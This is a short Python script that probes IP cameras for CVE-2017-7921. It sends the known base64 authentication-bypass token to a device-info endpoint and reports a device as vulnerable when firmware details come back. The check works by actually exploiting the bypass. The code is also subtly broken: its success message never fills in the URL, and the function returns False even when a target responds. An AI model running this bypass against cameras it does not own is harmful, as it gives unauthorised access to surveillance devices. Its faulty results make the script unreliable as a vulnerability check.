import requests

def check_CVE_2017_7921(ip, port=None):
    path = "/system/deviceInfo?auth=YWRtaW46MTEK"
    matcher = "<firmwareVersion>"
    protocols = ["http", "https"]
    ports = [f":{port}" if port else ""]
    for protocol in protocols:
        for port_suffix in ports:
            url = f"{protocol}://{ip}{port_suffix}{path}"
            try:
                response = requests.get(url, timeout=5, verify=False)
                if matcher in response.text:
                    print("[+] The target is vulnerable to CVE-2017-7921 : {url}")
            except requests.RequestException:
                continue
    return False
